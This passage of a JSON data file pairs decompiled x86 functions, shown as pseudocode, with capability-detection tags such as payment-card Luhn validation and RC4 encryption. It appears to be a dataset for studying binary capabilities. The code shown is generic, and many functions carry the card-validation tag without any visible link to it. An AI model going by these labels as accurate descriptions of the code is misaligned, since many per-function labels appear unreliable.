(*arg_ch - piVar1);\n            *arg_ch = *arg_ch + -1;\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    var_24h = 0x461bef;\n    fcn.004045ec();\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 877
    },
    "004628c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_dh\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004628c8(void)\n\n{\n    int16_t iVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uchar uVar5;\n    uint var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar auStack20 [3];\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x4 = 6;\n    do {\n        *0x4 = *0x4 + -1;\n    } while (*0x4 != 0);\n    var_1ch = 0x4628e8;\n    _auStack20 = unaff_EBX;\n    fcn.00404a78();\n    var_20h = 0x462b23;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004628c8::var_24h;\n    _auStack20 = _auStack20 & 0xffffff | **0x4847fc << 0x18;\n    var_28h = 0x46290b;\n    var_1ch = &stack0xfffffffc;\n    fcn.004047b0();\n    var_28h = 0x462916;\n    iVar1 = fcn.00404bcc();\n    if (iVar1 < 1) {\n        var_28h = 0x4629cd;\n        iVar3 = fcn.00404888();\n        uVar5 = iVar3 == 1;\n        var_28h = 0x4629dc;\n        fcn.0040461c();\n    }\n    else {\n        var_28h = 0x46292d;\n        fcn.0040461c();\n        var_28h = 0x462939;\n        pcVar2 = fcn.00404a88();\n        if (*pcVar2 == var_dh) {\n            var_28h = &fcn.004628c8::var_4h;\n            var_2ch = 0x46294c;\n            fcn.00404888();\n            var_2ch = 0x46295c;\n            fcn.00404ae8();\n            while( true ) {\n                var_30h = 0x46298f;\n                pcVar2 = fcn.00404a88();\n                uVar5 = *pcVar2 == '0';\n                if (!uVar5) break;\n                var_30h = 0x46296a;\n                fcn.00404890();\n                var_2ch = &fcn.004628c8::var_4h;\n                fcn.00404888();\n                fcn.00404ae8();\n            }\n        }\n        else {\n            var_28h = pcVar2 & 0xffffff00 | *0x462b4c;\n            var_2ch = &fcn.004628c8::var_18h;\n            var_30h = 0x4629ab;\n            fcn.004047b0();\n            uVar5 = 1;\n            var_30h = 0x4629b8;\n            fcn.0040dd94(var_2ch, var_28h);\n            var_30h = 0x4629c3;\n            fcn.00404660();\n        }\n    }\n    var_30h = 0x4629e9;\n    fcn.004049d4();\n    if (!uVar5) {\n        var_30h = 0x4629f3;\n        iVar3 = fcn.00404888();\n        uVar5 = iVar3 == 1;\n        var_30h = 0x462a00;\n        fcn.00404c78();\n        var_30h = 0x462a10;\n        fcn.004048d4();\n        var_30h = 0x462a1b;\n        fcn.004049d4();\n        if (!uVar5) {\n            var_30h = 0x462a46;\n            fcn.00404660();\n            var_30h = 0x462a51;\n            fcn.00404660();\n            var_30h = 0x462a59;\n            iVar1 = fcn.00404888();\n            var_30h = 0x462a69;\n            fcn.00404c78();\n            var_30h = 0x462a74;\n            fcn.00404890();\n            var_30h = 0x462a7f;\n            iVar3 = fcn.0046199c();\n            uVar5 = iVar3 == 0;\n            if (iVar3 < 0) {\n                var_30h = 0x462a90;\n                fcn.00404890();\n            }\n            var_30h = 0x462a97;\n            fcn.004045c8();\n            while( true ) {\n                var_30h = 0x462ad2;\n                fcn.004049d4();\n                if (uVar5) break;\n                var_30h = 0x462adb;\n                iVar3 = fcn.00404888();\n                iVar4 = (iVar1 + -1) + 0x40;\n                uVar5 = iVar3 == iVar4;\n                if (iVar4 <= iVar3) break;\n                var_2ch = &fcn.004628c8::var_30h;\n                fcn.00462664(var_2ch);\n                fcn.00404890();\n                fcn.004048d4();\n            }\n            var_30h = 0x462af1;\n            fcn.00462724();\n            var_30h = 0x462afb;\n            fcn.0040461c();\n            goto code_r0x00462afb;\n        }\n    }\n    var_30h = 0x462a2a;\n    fcn.00462724();\n    var_30h = 0x462a34;\n    fcn.0040461c();\ncode_r0x00462afb:\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x462b2a;\n    var_28h = 0x462b15;\n    fcn.004045ec();\n    var_28h = 0x462b22;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 1562
    },
    "00462b5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00462b5c(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    char *pcVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStack40;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x462b79;\n    var_8h = param_2;\n    fcn.00404a78();\n    puStack28 = 0x462b81;\n    fcn.00404a78();\n    uStack32 = 0x462cb9;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    pcVar3 = fcn.00404a88();\n    cVar1 = *pcVar3;\n    pcVar3 = fcn.00404a88();\n    if (cVar1 != *pcVar3) {\n        pcVar3 = fcn.00404a88();\n        if ((*pcVar3 == '-') || (*pcVar3 == '-')) {\n            bVar2 = true;\n            goto code_r0x00462bc1;\n        }\n    }\n    bVar2 = false;\ncode_r0x00462bc1:\n    puStack40 = 0x462bcb;\n    pcVar3 = fcn.00404a88();\n    if (*pcVar3 == '-') {\n        puStack40 = &fcn.00462b5c::var_4h;\n        fcn.00404888();\n        fcn.00404ae8();\n    }\n    pcVar3 = fcn.00404a88();\n    if (*pcVar3 == '-') {\n        fcn.00404888(&fcn.00462b5c::var_8h);\n        fcn.00404ae8();\n    }\n    while (pcVar3 = fcn.00404a88(),  *pcVar3 == '0') {\n        puStack40 = &fcn.00462b5c::var_4h;\n        fcn.00404888();\n        fcn.00404ae8();\n    }\n    while (pcVar3 = fcn.00404a88(),  *pcVar3 == '0') {\n        puStack40 = &fcn.00462b5c::var_8h;\n        fcn.00404888();\n        fcn.00404ae8();\n    }\n    fcn.004628c8();\n    fcn.004625f4();\n    fcn.0040461c();\n    if (bVar2) {\n        fcn.004048d4();\n    }\n    *in_FS_OFFSET = puStack40;\n    uStack32 = 0x462cc0;\n    iStack36 = 0x462cb8;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 657
    },
    "00463338": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463338(uint8_t param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t **in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint8_t *puStack12;\n    \n    uVar1 = **in_EAX;\n    puStack12 = param_2;\n    for (iVar3 = 0; uVar2 = uVar1,  iVar3 < param_1; iVar3 = iVar3 + 2) {\n        uVar1 = *puStack12;\n        **in_EAX = (uVar2 & 0xffffff0f) << 4 | uVar1 >> 4;\n        *in_EAX = *in_EAX + 1;\n        puStack12 = puStack12 + 1;\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "00463380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004633e3)\n// WARNING: Removing unreachable block (ram,0x00463430)\n\nvoid __fastcall fcn.00463380(uint param_1, uint *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    uint8_t uStack112;\n    uint8_t auStack110 [32];\n    uint8_t auStack78 [66];\n    \n    puVar8 = &uStack112;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = *param_2;\n        param_2 = param_2 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = *param_2;\n    fcn.004031a8();\n    iVar7 = 0;\n    uVar2 = fcn.004641b4();\n    uVar3 = fcn.004641b4();\n    iVar9 = ((uVar2 & 0xffff) - (uVar3 & 0xffff)) + (uStack112 - *in_EAX);\n    iVar5 = uStack112 >> 1;\n    if (-1 < iVar5) {\n        iVar6 = iVar5 + 1;\n        iVar4 = 0;\n        puVar10 = &uStack112 + 2;\n        do {\n            uVar1 = *puVar10;\n            if (iVar9 <= iVar4 * 2) {\n                auStack78[iVar7] = uVar1 >> 4;\n                iVar7 = iVar7 + 1;\n            }\n            if (iVar9 <= iVar4 * 2 + 1) {\n                auStack78[iVar7] = uVar1 & 0xf;\n                iVar7 = iVar7 + 1;\n            }\n            iVar4 = iVar4 + 1;\n            puVar10 = puVar10 + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n    }\n    auStack78[iVar7] = 0;\n    iVar7 = 0;\n    if (-1 < iVar5) {\n        iVar5 = iVar5 + 1;\n        puVar10 = in_EAX + 2;\n        do {\n            *puVar10 = auStack78[iVar7] << 4 | auStack78[iVar7 + 1] & 0xf;\n            iVar7 = iVar7 + 2;\n            puVar10 = puVar10 + 1;\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    return;\n}\n",
        "token_count": 646
    },
    "004634b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004634e4)\n\nvoid __fastcall fcn.004634b8(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint *puVar6;\n    uint8_t *puVar7;\n    int32_t iStack116;\n    uint8_t uStack112;\n    uint8_t auStack110 [31];\n    char acStack79 [67];\n    \n    puVar6 = &uStack112;\n    for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = *param_2;\n        param_2 = param_2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = *param_2;\n    acStack79[1] = 0;\n    iVar4 = 1;\n    iStack116 = (uStack112 >> 1) + 1;\n    puVar7 = &uStack112 + 2;\n    puVar5 = in_EAX + 2;\n    do {\n        uVar2 = *puVar7;\n        pcVar1 = acStack79 + iVar4;\n        acStack79[iVar4 + 1] = uVar2 >> 4;\n        iVar3 = iVar4 + 1;\n        acStack79[iVar4 + 2] = uVar2 & 0xf;\n        iVar4 = iVar4 + 2;\n        *puVar5 = *pcVar1 << 4 | acStack79[iVar3] & 0xfU;\n        puVar5 = puVar5 + 1;\n        puVar7 = puVar7 + 1;\n        iStack116 = iStack116 + -1;\n    } while (iStack116 != 0);\n    if (iVar4 < 0x20) {\n        *(in_EAX + 2 + iVar4) = 0;\n    }\n    return;\n}\n",
        "token_count": 468
    },
    "004637b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004637b8(uint noname_0, uint arg_ch)\n\n{\n    uint16_t uVar1;\n    ushort uVar2;\n    uint uVar3;\n    uint32_t arg_8h;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint var_6ch;\n    uint var_48h;\n    uint var_26h;\n    uint var_4h;\n    \n    fcn.00463738();\n    fcn.00463738();\n    if ((0x20 < var_26h) || (0x20 < var_48h)) {\n        uVar3 = fcn.00463680();\n        fcn.00463680(uVar3);\n        fcn.0042d70c();\n        fcn.004636a4();\n        puVar6 = &var_6ch;\n        puVar7 = &var_26h;\n        for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = *puVar6;\n        fcn.004636a4();\n        puVar6 = &var_6ch;\n        puVar7 = &var_48h;\n        for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = *puVar6;\n    }\n    uVar1 = fcn.0042d70c();\n    uVar2 = fcn.004641b4();\n    fcn.004641b4(uVar2);\n    arg_8h = fcn.0042d70c();\n    for (; uVar1 < 0x40; uVar1 = uVar1 + 2) {\n        uVar4 = fcn.004641b4();\n        iVar5 = uVar1 - (arg_8h & 0xffff);\n        if ((var_26h - (uVar4 & 0xffff) <= iVar5) && (uVar4 = fcn.004641b4(),  var_48h - (uVar4 & 0xffff) <= iVar5))\n        break;\n    }\n    fcn.00463540(arg_8h);\n    fcn.00463540(arg_8h);\n    return;\n}\n",
        "token_count": 598
    },
    "004639cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004639cc(uint param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uStack48;\n    \n    puVar1 = &uStack48;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = *param_2;\n        param_2 = param_2 + 1;\n        puVar1 = puVar1 + 1;\n    }\n    *puVar1 = *param_2;\n    uStack48._1_1_ = fcn.0046332c();\n    fcn.00463d28();\n    return;\n}\n",
        "token_count": 157
    },
    "00464598": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00464598(uint arg_8h)\n\n{\n    char in_CL;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_CL == '\\0') {\n        fcn.00409998(arg_8h);\n    }\n    else if (in_CL == '\\x01') {\n        fcn.00409998(arg_8h);\n    }\n    else if (in_CL == '\\x02') {\n        fcn.00409998(arg_8h);\n    }\n    else if (in_CL == '\\x03') {\n        fcn.00409998(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "00464678": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00464678(uint arg_8h)\n\n{\n    uchar in_CL;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    // switch table (16 cases) at 0x464698\n    switch(in_CL) {\n    case 0:\n        fcn.00409998(arg_8h);\n        break;\n    case 1:\n        fcn.00409998(arg_8h);\n        break;\n    case 2:\n        fcn.00409998(arg_8h);\n        break;\n    case 3:\n        fcn.00409998(arg_8h);\n        break;\n    case 4:\n        fcn.00409998(arg_8h);\n        break;\n    case 5:\n        fcn.00409998(arg_8h);\n        break;\n    case 6:\n        fcn.00409998(arg_8h);\n        break;\n    case 7:\n        fcn.00409998(arg_8h);\n        break;\n    case 8:\n        fcn.00409998(arg_8h);\n        break;\n    case 9:\n        fcn.00409998(arg_8h);\n        break;\n    case 10:\n        fcn.00409998(arg_8h);\n        break;\n    case 0xb:\n        fcn.00409998(arg_8h);\n        break;\n    case 0xc:\n        fcn.00409998(arg_8h);\n        break;\n    case 0xd:\n        fcn.00409998(arg_8h);\n        break;\n    case 0xe:\n        fcn.00409998(arg_8h);\n        break;\n    case 0xf:\n        fcn.00409998(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "00464af4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00464af4(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *in_stack_ffffffc8;\n    int32_t iStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_10h = 0;\n    var_ch = 0;\n    uStack40 = 0x464ba0;\n    iStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_5h._0_1_ = in_DL;\n    fcn.0046434c(arg_8h);\n    if (var_5h == '\\x01') {\n        in_stack_ffffffc8 = 0x464b4b;\n        fcn.00464364(arg_8h);\n    }\n    else if (var_5h - 2U < 2) {\n        in_stack_ffffffc8 = &fcn.00464af4::var_10h;\n        fcn.004643b0(in_stack_ffffffc8, arg_ch);\n        fcn.0040461c();\n    }\n    else if (var_5h - 2U == 2) {\n        in_stack_ffffffc8 = &fcn.00464af4::var_ch;\n        fcn.00464a08(in_stack_ffffffc8, arg_ch);\n        fcn.0040461c();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    fcn.004045ec(0x464ba7);\n    return;\n}\n",
        "token_count": 392
    },
    "00464d04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464d04(int32_t param_1, int32_t *param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffcc;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x464da9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    fcn.004047b0();\n    iVar1 = fcn.00404bcc();\n    if (iVar1 == 0) {\n        iVar1 = fcn.00404888();\n    }\n    else {\n        iVar1 = iVar1 + -1;\n    }\n    if (param_1 != iVar1 && -1 < param_1 - iVar1) {\n        fcn.00404c78(0x464dc4);\n        in_stack_ffffffcc = *in_EAX;\n        fcn.00404948(in_stack_ffffffcc, 0);\n        *param_2 = *param_2 + 1;\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    fcn.004045ec(0x464db0);\n    return;\n}\n",
        "token_count": 307
    },
    "00464ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00464ee0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack36 = 0x464ef2;\n        in_EAX = fcn.00403b58();\n    }\n    puStack36 = 0x464f01;\n    fcn.00404a78();\n    uStack40 = 0x464f36;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0040461c();\n    *(in_EAX + 8) = arg_8h;\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x464f3d;\n    uStack40 = 0x464f35;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 241
    },
    "00465664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465664(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_22h;\n    \n    puStack68 = &stack0xfffffffc;\n    puVar3 = &fcn.00465664::var_22h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = *param_2;\n        param_2 = param_2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *param_2;\n    uStack72 = 0x46571c;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    cVar1 = fcn.004641c0();\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.004641c8();\n        if (cVar1 == '\\0') {\n            fcn.00465524();\n            fcn.0046520c();\n        }\n        else {\n            fcn.00465524();\n            fcn.0046520c();\n        }\n    }\n    else {\n        fcn.00465524();\n        fcn.0046520c();\n    }\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x465723;\n    uStack72 = 0x46571b;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 391
    },
    "00465950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00465950(uint param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    fcn.0040461c(param_1);\n    puVar1 = fcn.004090c8();\n    while( true ) {\n        iVar2 = fcn.00404888();\n        if ((iVar2 < 1) || ((0x20 < *puVar1 && (*puVar1 != 0x2e)))) break;\n        fcn.00404a88();\n        fcn.00404c14();\n        puVar1 = fcn.004090c8();\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "00465a78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465a78(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack40 = 0x465a8c;\n        fcn.00403b58();\n    }\n    uStack44 = 0x465aea;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00465950();\n    fcn.004659a8(arg_8h, arg_14h);\n    fcn.0040461c();\n    fcn.0040461c();\n    *in_FS_OFFSET = arg_8h;\n    uStack48 = 0x465af1;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 232
    },
    "00465b9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00465b9c(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_8h;\n    uint rclsid;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    uStack52 = 0x465c7c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    uStack64 = 0x465bf7;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    uVar1 = fcn.00406298();\n    uVar2 = 0x465c8c;\n    sub.ole32.dll_CoCreateInstance(in_EAX, 0, 5, 0x465c8c, uVar1);\n    fcn.00465b2c();\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = uVar2;\n    uStack68 = 0x465c83;\n    fcn.004045c8();\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 307
    },
    "004664cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004664cc(int32_t arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(arg_8h + -4);\n    var_4h._0_1_ = 6;\n    fcn.0040c9d4(0, &var_8h);\n    fcn.00403fc0();\n    return;\n}\n",
        "token_count": 105
    },
    "0046bacc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bacc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack36 = 0x46bade;\n        in_EAX = fcn.00403b58();\n    }\n    puStack36 = 0x46baed;\n    fcn.00404a78();\n    puStack36 = 0x46baf5;\n    fcn.00404a78();\n    uStack40 = 0x46bb4a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.0040461c();\n    *(in_EAX + 0xc) = arg_10h;\n    *(in_EAX + 0x10) = arg_ch;\n    *(in_EAX + 0x18) = arg_8h;\n    fcn.0040c8dc();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46bb51;\n    uStack40 = 0x46bb41;\n    fcn.004045c8();\n    uStack40 = 0x46bb49;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 343
    },
    "0046be1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046be1c(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed0;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint var_114h;\n    uint var_110h;\n    int32_t var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack292 = &stack0xfffffffc;\n    uStack296 = 0x46beea;\n    uStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    puVar1 = &stack0xfffffffc;\n    if (param_2 != 0) {\n        in_stack_fffffed0 = 0x46be4f;\n        iVar3 = fcn.00408ab8();\n        puVar1 = puStack292;\n        if (iVar3 != 0) {\n            in_stack_fffffed0 = 0x46be61;\n            cVar2 = fcn.004039b8();\n            puVar1 = puStack292;\n            if (cVar2 != '\\0') {\n                in_stack_fffffed0 = 0x46be6f;\n                iVar3 = fcn.0046c0c8();\n                puVar1 = puStack292;\n                if (-1 < iVar3) {\n                    in_stack_fffffed0 = 0;\n                    var_ch._0_1_ = 0xb;\n                    var_10h = param_2;\n                    fcn.00403770();\n                    var_8h = &fcn.0046be1c::var_110h;\n                    var_4h._0_1_ = 4;\n                    fcn.0040675c(&fcn.0046be1c::var_10h);\n                    fcn.0046bc4c(in_stack_fffffed0);\n                    puVar1 = puStack292;\n                }\n            }\n        }\n    }\n    puStack292 = puVar1;\n    fcn.0040461c();\n    fcn.0041cff4();\n    *in_FS_OFFSET = in_stack_fffffed0;\n    uStack296 = 0x46bef1;\n    uStack300 = 0x46bee9;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 553
    },
    "0046bef8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0046bef8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.0041d530(arg_8h);\n    *(in_EAX + 0x1c) = in_ECX;\n    *(in_EAX + 0x2c) = in_EAX;\n    *(in_EAX + 0x28) = fcn.0046c048;\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = arg_8h;\n    }\n    return in_EAX;\n}\n",
        "token_count": 213
    },
    "0046c314": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
